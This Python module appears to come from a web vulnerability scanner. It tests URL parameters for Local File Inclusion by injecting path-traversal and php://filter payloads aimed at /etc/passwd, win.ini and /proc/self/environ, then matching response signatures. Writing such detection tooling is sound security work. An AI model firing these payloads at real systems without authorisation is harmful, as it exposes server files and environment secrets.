"""lfi.py - Local File Inclusion detection."""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Callable, Optional

LFI_PAYLOADS = [
    ("../../etc/passwd",                               "root:x:0:0:"),
    ("../../../etc/passwd",                            "root:x:0:0:"),
    ("../../../../etc/passwd",                         "root:x:0:0:"),
    ("/etc/passwd",                                    "root:x:0:0:"),
    ("....//....//....//etc/passwd",                   "root:x:0:0:"),
    ("%2F%2F..%2F..%2Fetc%2Fpasswd",                  "root:x:0:0:"),
    ("..\\..\\..\\..\\windows\\win.ini",               "[extensions]"),
    ("C:\\Windows\\win.ini",                           "[extensions]"),
    ("/proc/self/environ",                             "HTTP_"),
    ("php://filter/convert.base64-encode/resource=index", "PD9waHA"),
]


def run(client, pages, progress_cb: Optional[Callable] = None) -> list:
    findings = []
    for page in pages:
        if not page.url_params:
            continue
        if progress_cb:
            progress_cb(f"[lfi] Testing {page.url}")
        parsed = urlparse(page.url)
        query  = parse_qs(parsed.query)

        for param in page.url_params:
            for payload, signature in LFI_PAYLOADS:
                tq = {k: v[0] for k, v in query.items()}
                tq[param] = payload
                url = urlunparse(parsed._replace(query=urlencode(tq)))
                resp = client.get(url)
                if resp and signature in resp.text:
                    findings.append({
                        "type":     "Local File Inclusion (LFI)",
                        "severity": "Critical",
                        "url":      page.url,
                        "location": f"GET parameter '{param}'",
                        "description": (
                            f"Parameter '{param}' is vulnerable to LFI — the server returned "
                            "content from a local file when given a traversal payload."
                        ),
                        "evidence":    f"Signature '{signature}' found in response to payload: {payload}",
                        "recommendation": "Use a whitelist for file paths; never include files based on user-controlled input.",
                        "test_url": url,
                    })
                    break
    return findings
